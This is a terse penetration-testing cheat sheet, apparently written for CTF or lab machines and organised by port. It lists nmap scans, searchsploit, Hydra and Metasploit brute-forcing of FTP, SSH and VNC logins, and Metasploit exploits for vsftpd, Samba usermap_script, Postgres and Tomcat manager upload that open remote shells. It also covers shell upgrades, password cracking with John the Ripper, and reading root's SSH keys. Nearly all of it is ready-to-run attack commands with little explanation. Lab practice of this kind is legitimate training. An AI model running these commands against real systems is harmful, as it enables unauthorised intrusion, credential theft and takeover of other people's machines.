#### Nmap

 nmap -Pn -sV Target
 
 nmap -sV -sC 10.10.91.172 -Pn

 nmap -sC -sT Target   (TCP SCAN)

 nmap -A Target (Aggressive scan)

 

 #### Searchsploit

 searchsploit service version
 
 searchsploit -m number_of_the_exploit(like 42233)
 
 Go to the directory where it is downloaded it would be the same directory.

 open it, cat 42233.txt and read it.

 


### Port 21
#### Hydra

sudo hydra -L user.txt -P pass.txt target ftp   ----> FTP

#### Vsftpd Exploit

In msfconsole

search vsftpd version

use exploit/unix/ftp/
show options
set RHOSTS ip
exploit

### Port 22

#### Hydra

hydra -L user.txt -P pass.txt 192.168.1.103 ssh

#### SSH BFA
use **auxiliary/scanner/ssh/ssh_login**
show options

set RHOSTS ip

set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/root_userpass.txt

or 

set USER_FILE /usr/share/user.txt
set PASS_FILE /usr/share/pass.txt

or 

**set STOP_ON_SUCCESS true**

set VERBOSE true

exploit

If sessions opened type
sessions
sessions 1 or 2 or whatever the shell opened is or sessions -u 1 or 2
shell (For better view type shell, it will look like linux)

Connect: ssh username@ip

### Port 139 & 445 (Samba)

use **exploit/multi/samba/usermap_script**

show options

set RHOSTS ip

exploit

id , uname -a, python -c 'import pty:pty.spawn("/bin/bash")'

#### Connect to SMB (View Shares)

smbclient -L \\10.10.101.175

smbclient //10.10.101.175/anonymous

ls

get log.txt

#### John The Ripper command

john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-sha1 file


#### Hydra Commands

hydra -l username -P passwordlist.txt ssh://target_ip

hydra -L userlist.txt -P passwordlist.txt ftp://target_ip

hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 10.10.137.76 ssh


### Base32 and 64 Decode

echo "KBQWY4DONAQHE53UOJ5CA2LXOQQEQSCBEBZHIZ3JPB2XQ4TQNF2CA5LEM4QHEYLKORUC4===" | base32 -d


### Port  5432 (Postgres)

search postgres
use **exploit/linux/postgres/postgres_payload**
set RHOSTS ip
set LHOST ip
run
sessions -u 1 or 2 or whichever

### Port 5900 (VNC)

use **auxiliary/scanner/vnc/vnc_login**
set RHOSTS
exploit

after getting password go to terminal

vncviewer vulnerable_ip

For authorized ssh keys after login:
cd root
ls -la
cd .ssh
ls -la
cat authorized_keys

### Port 8180 (Not default port) (Tomcat)

use exploit/multi/http/tomcat_mgr_upload

show options

set RHOSTS

set RPORT 8180

set HttpUsername tomcat

set HttpPassword tomcat

### Port 3389

xfreerdp /u:wade /p:parzival /v:10.10.167.18  (Connect using Linux)

### Nessus

nessus ( command /bin/systemctl start nessusd.service, the go to https://localhost:8834/#/ and login, root, Root@123 in windows)

#### For Windows

Start

C:\Windows\system32>net start "Tenable Nessus"

Stop	

C:\Windows\system32>net stop "Tenable Nessus"
